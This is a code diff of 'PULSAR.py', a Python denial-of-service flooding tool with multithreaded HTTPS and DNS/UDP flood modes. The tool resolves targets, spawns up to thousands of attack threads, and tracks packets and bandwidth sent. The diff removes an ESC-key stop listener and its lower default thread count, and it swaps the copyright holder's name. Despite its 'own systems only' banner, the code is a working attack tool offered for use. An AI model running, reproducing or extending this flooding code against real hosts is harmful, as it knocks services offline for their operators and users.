@@ -1,5 +1,5 @@
 # PULSAR.py
-# Copyright (c) 2025 ANOXL
+# Copyright (c) 2025 SALOYEK
 # Licensed under the MIT License. See LICENSE file for details.
 
 import socket
@@ -20,16 +20,9 @@ def set_console_title(title_text):
         sys.stdout.flush()
 
 PROGRAM_NAME = "PULSAR"
-STOP_KEY_INFO = "ESC TO STOP" 
+STOP_KEY_INFO = "Ctrl+C TO STOP"
 DNS_PORT = 53
 DEFAULT_ATTACK_TYPE = "HTTPS"
-
-try:
-    import keyboard 
-    KEYBOARD_AVAILABLE = True
-except ImportError:
-    KEYBOARD_AVAILABLE = False
-    keyboard = None 
 
 stop_event = threading.Event()
 packets_sent = 0
@@ -64,8 +57,7 @@ BANNER = f"""
 {Colors.ENDC}
        {Colors.OKGREEN}Simple Denial of Service Test Tool{Colors.ENDC}
 """
-DEFAULT_THREADS_LOW_RESOURCE = 5 
-DEFAULT_THREADS_NORMAL = 100
+DEFAULT_THREADS = 100
 
 def strip_ansi_codes(text):
     return re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{1,2})?)?[m|K|H|f|J]', '', text)
@@ -75,8 +67,7 @@ def visible_len(text_with_ansi):
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
-    current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
-    set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")
+    set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}")
 
 def print_ui_header(text, color=Colors.OKCYAN):
     print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
@@ -84,8 +75,7 @@ def print_ui_header(text, color=Colors.OKCYAN):
     content_visible_len = visible_len(text_content)
     innerWidth = UI_WIDTH - 2 
     padding_total = innerWidth - content_visible_len
-    padding_left = padding_total // 2
-    padding_right = padding_total - padding_left
+    padding_left = padding_total // 2; padding_right = padding_total - padding_left
     padding_left = max(0, padding_left); padding_right = max(0, padding_right)
     print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}{' ' * padding_left}{text_content}{' ' * padding_right}{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
     print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
@@ -110,7 +100,7 @@ def print_success(text): print(f"{Colors.OKGREEN}│ [+] SUCCESS:{Colors.ENDC} {
 def print_error(text): print(f"{Colors.FAIL}│ [X] ERROR:{Colors.ENDC} {text}")
 
 def get_random_user_agent():
-    return random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", f"{PROGRAM_NAME} Agent/1.4"])
+    return random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", f"{PROGRAM_NAME} Agent/1.5"])
 
 def format_size(num_bytes):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
@@ -155,8 +145,7 @@ def estimate_traffic(attack_type, target_input_for_est, port, num_threads, durat
     print_ui_header("TRAFFIC ESTIMATION", Colors.OKCYAN)
     if attack_type == "DNS":
         print_info(f"Estimating for DNS (UDP Flood) on {target_input_for_est}:{DNS_PORT}...")
-        avg_payload_size = (32 + 128) // 2
-        assumed_pps_per_worker = 500 
+        avg_payload_size = (32 + 128) // 2; assumed_pps_per_worker = 500 
         estimated_total_packets = num_threads * assumed_pps_per_worker * duration
         estimated_total_data_bytes = estimated_total_packets * avg_payload_size
         print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
@@ -165,7 +154,6 @@ def estimate_traffic(attack_type, target_input_for_est, port, num_threads, durat
         print_boxed_key_value("Est. Outgoing Traffic", format_size(estimated_total_data_bytes), value_color=f"{Colors.OKGREEN}{Colors.BOLD}")
         print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
         print_warning("This is a VERY ROUGH estimate for UDP flood."); return estimated_total_data_bytes, estimated_total_packets
-
     target_ip_for_est = None; target_host_for_header_est = target_input_for_est 
     if is_valid_ip(target_input_for_est): target_ip_for_est = target_input_for_est
     else:
@@ -206,7 +194,8 @@ def estimate_traffic(attack_type, target_input_for_est, port, num_threads, durat
 def get_interactive_input():
     clear_console(); print(BANNER)
     print_ui_header(f"{PROGRAM_NAME} INTERACTIVE SETUP")
-    current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
+    current_default_threads = DEFAULT_THREADS
+    
     def get_styled_input(prompt_main, prompt_example="", default_value_text=""):
         full_prompt = f" {Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
         if prompt_example: full_prompt += f"{Colors.OKBLUE}({prompt_example}){Colors.ENDC} "
@@ -289,29 +278,16 @@ def get_interactive_input():
             threads_val_int = int(raw_threads)
             if threads_val_int <= 0: print_warning("Threads must be > 0."); continue
             if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high!")
-            elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high.")
-            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC env.")
+            elif threads_val_int > 2000 : print_warning(f"Threads ({threads_val_int}) very high.")
             num_threads_val = threads_val_int; print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n"); break
         except ValueError: print_warning("Not a valid number for threads.")
             
     return attack_type_val, target_input_val, target_port_val, duration_val, num_threads_val
 
-def esc_listener_thread_func():
-    global user_interrupted_attack, stop_event
-    if KEYBOARD_AVAILABLE and keyboard:
-        try:
-            keyboard.wait('esc', suppress=True) 
-            if not stop_event.is_set():
-                print(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        ")
-                user_interrupted_attack = True; stop_event.set()
-        except Exception: pass
-
 def run_attack(attack_type, target_input_val, target_port_val, duration_val, num_threads_val):
     global packets_sent, bytes_sent, stop_event, user_interrupted_attack
     packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
-    current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
-    attack_desc = f"{attack_type} on {target_input_val}" + (f":{target_port_val}" if attack_type == "HTTPS" else f":{DNS_PORT}(UDP)")
-    current_attack_title = f"{PROGRAM_NAME} - {attack_desc} - {current_stop_key}"
+    current_attack_title = f"{PROGRAM_NAME} - Attacking {target_input_val} - {STOP_KEY_INFO}"
     set_console_title(current_attack_title)
     print_ui_header("ATTACK CONFIGURATION", Colors.OKGREEN)
     print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
@@ -327,31 +303,29 @@ def run_attack(attack_type, target_input_val, target_port_val, duration_val, num
         else:
             print_info(f"Target '{target_input_val}' is domain. Resolving...");
             try: target_ip_to_connect = socket.gethostbyname(target_input_val); print_success(f"Resolved to IP: {target_ip_to_connect}")
-            except socket.gaierror as e: print_error(f"Resolve failed: {e}"); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False 
-        if not target_ip_to_connect: print_error("Could not get IP."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False
+            except socket.gaierror as e: print_error(f"Resolve failed: {e}"); set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return False 
+        if not target_ip_to_connect: print_error("Could not get IP."); set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return False
     elif attack_type == "DNS": target_dns_server_ip = target_input_val; print_info(f"DNS Flood target IP: {target_dns_server_ip}")
     estimate_traffic(attack_type, target_input_val, target_port_val, num_threads_val, duration_val)
     try:
         confirm_prompt = f" {Colors.WARNING}│ [?] START ATTACK?{Colors.ENDC} ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): "
         confirm = input(confirm_prompt).strip().upper()
-        if confirm != 'YES': print_info("Attack cancelled."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return "cancelled"
+        if confirm != 'YES': print_info("Attack cancelled."); set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return "cancelled"
     except KeyboardInterrupt: print_error("\nInput interrupted. Exiting."); sys.exit(1)
     use_ssl_for_http = (target_port_val == 443) if attack_type == "HTTPS" else False
     print_ui_header("ATTACK IN PROGRESS", Colors.FAIL)
     display_target = target_dns_server_ip if attack_type == "DNS" else f"{target_ip_to_connect}:{target_port_val}"
     print_info(f"Type: {Colors.BOLD}{attack_type}{Colors.ENDC} | Target: {Colors.BOLD}{display_target}{Colors.ENDC} | Duration: {Colors.BOLD}{duration_val}{Colors.ENDC}s...")
-    listener_thread_obj = None
-    if KEYBOARD_AVAILABLE: 
-        print_info(f"Press {Colors.BOLD}ESC{Colors.ENDC} to stop early.")
-        listener_thread_obj = threading.Thread(target=esc_listener_thread_func, daemon=True); listener_thread_obj.start()
-    else: print_info(f"Press {Colors.BOLD}Ctrl+C{Colors.ENDC} to stop attack (ESC disabled).")
+    print_info(f"Press {Colors.BOLD}Ctrl+C{Colors.ENDC} to stop the attack.")
     threads_list = []; start_time = time.perf_counter()
-    for _ in range(num_threads_val):
-        if attack_type == "HTTPS": worker_func = attack_http_worker; worker_args = (target_ip_to_connect, target_port_val, target_host_for_header, use_ssl_for_http)
-        elif attack_type == "DNS": worker_func = attack_dns_worker; worker_args = (target_dns_server_ip,)
-        else: continue
-        thread = threading.Thread(target=worker_func, args=worker_args); threads_list.append(thread); thread.daemon = True; thread.start()
     try:
+        for _ in range(num_threads_val):
+            if stop_event.is_set(): break
+            if attack_type == "HTTPS": worker_func = attack_http_worker; worker_args = (target_ip_to_connect, target_port_val, target_host_for_header, use_ssl_for_http)
+            elif attack_type == "DNS": worker_func = attack_dns_worker; worker_args = (target_dns_server_ip,)
+            else: continue
+            thread = threading.Thread(target=worker_func, args=worker_args); threads_list.append(thread); thread.daemon = True; thread.start()
+        
         progress_bar_fixed_width = 25 
         while True:
             elapsed_time = time.perf_counter() - start_time
@@ -368,17 +342,17 @@ def run_attack(attack_type, target_input_val, target_port_val, duration_val, num
             status_line_content = f"{progress_text} | {time_text} | {sent_text} | {speed_text}"
             padding = UI_WIDTH - (visible_len(status_line_content)) -1 ; padding = max(0, padding)
             sys.stdout.write(f"\r{status_line_content}{' ' * padding}"); sys.stdout.flush(); time.sleep(0.1)
-        if not stop_event.is_set() and not user_interrupted_attack: sys.stdout.write("\n"); print_info("Test duration elapsed.")
+        
+        if not stop_event.is_set() and not user_interrupted_attack: 
+            sys.stdout.write("\n") 
+            print_info("Test duration elapsed.")
     except KeyboardInterrupt:
-        if not KEYBOARD_AVAILABLE or not listener_thread_obj or not listener_thread_obj.is_alive():
-            sys.stdout.write("\n"); print_warning("\nAttack interrupted (Ctrl+C)... Stopping."); user_interrupted_attack = True
-            if not stop_event.is_set(): stop_event.set()
-        else: sys.stdout.write("\n"); print_warning(f"\n(Ctrl+C during attack. Press {Colors.BOLD}ESC{Colors.ENDC} to stop.)"); pass 
+        sys.stdout.write("\n"); print_warning("\nAttack interrupted by user (Ctrl+C)... Stopping."); user_interrupted_attack = True
+        if not stop_event.is_set(): stop_event.set()
     finally:
-        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); 
-        if not (not stop_event.is_set() and not user_interrupted_attack and elapsed_time >= duration_val):
-             if not user_interrupted_attack or (KEYBOARD_AVAILABLE and listener_thread_obj and listener_thread_obj.is_alive()):
-                 sys.stdout.write("\n")
+        set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); 
+        if not (not stop_event.is_set() and not user_interrupted_attack and 'elapsed_time' in locals() and elapsed_time >= duration_val):
+             if not user_interrupted_attack: sys.stdout.write("\n")
         sys.stdout.flush()
         if not stop_event.is_set(): stop_event.set() 
         print_info("Waiting for workers to finish..."); time.sleep(0.5)
@@ -393,11 +367,7 @@ def run_attack(attack_type, target_input_val, target_port_val, duration_val, num
             avg_bps = bytes_sent / final_elapsed_time; avg_pps = packets_sent / final_elapsed_time
             print_boxed_key_value("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)")
         print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
-        if user_interrupted_attack: 
-            interrupt_method = "ESC" 
-            if not (KEYBOARD_AVAILABLE and listener_thread_obj and not stop_event.is_set() and user_interrupted_attack):
-                 if stop_event.is_set(): interrupt_method = "Ctrl+C"
-            print_warning(f"Interrupted by user {interrupt_method}.")
+        if user_interrupted_attack: print_warning(f"Attack was interrupted by user (Ctrl+C).")
         print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---\n")
     return True
 
@@ -409,11 +379,7 @@ def main():
     if not is_color_supported:
         for attr in dir(Colors):
             if attr.isupper(): setattr(Colors, attr, "")
-    if not KEYBOARD_AVAILABLE:
-        print(f"{Colors.WARNING}[!] Lib 'keyboard' not installed. ESC disabled.{Colors.ENDC}")
-        print(f"{Colors.WARNING}Install: pip install keyboard. Use Ctrl+C to stop attack.{Colors.ENDC}")
-        try: input(f"{Colors.OKGREEN}Press Enter to continue...{Colors.ENDC}")
-        except KeyboardInterrupt: print_error("\nExiting."); sys.exit(1)
+    
     clear_console(); print(BANNER)
     print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!"); print_warning("Misuse is ILLEGAL.")
     parser = argparse.ArgumentParser(description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - DoS Test Tool.", epilog="Use responsibly!", formatter_class=argparse.RawTextHelpFormatter )
@@ -434,10 +400,9 @@ def main():
                 print_info("Using CLI parameters..."); 
                 attack_type, target, duration = args.attack_type, args.target, args.duration
                 port = args.port if args.attack_type == "HTTPS" else DNS_PORT
-                threads = args.threads if args.threads and args.threads > 0 else (DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL)
+                threads = args.threads if args.threads and args.threads > 0 else DEFAULT_THREADS
                 if threads > 5000: print_warning(f"CLI Workers ({threads}) EXTREMELY high...")
-                elif threads > 2000 and KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) very high...")
-                elif threads > 50 and not KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) high for no-ESC env.")
+                elif threads > 2000: print_warning(f"CLI Workers ({threads}) very high...")
                 last_target, last_port, last_duration, last_threads, last_attack_type = target, port, duration, threads, attack_type
                 cli_args_processed = True
             else:
@@ -471,10 +436,5 @@ if __name__ == "__main__":
     except SystemExit: pass
     except Exception as e: print_error(f"Unexpected global error: {type(e).__name__} - {e}")
     finally:
-        if KEYBOARD_AVAILABLE and keyboard:
-            try: keyboard.unhook_all() 
-            except: pass
-        current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Console"
-        if sys.platform == "win32": os.system(f"title {current_stop_key}") 
-        else: sys.stdout.write(f"\x1b]2;{current_stop_key}\x07"); sys.stdout.flush()
+        set_console_title(f"{PROGRAM_NAME}") 
         print(Colors.ENDC)
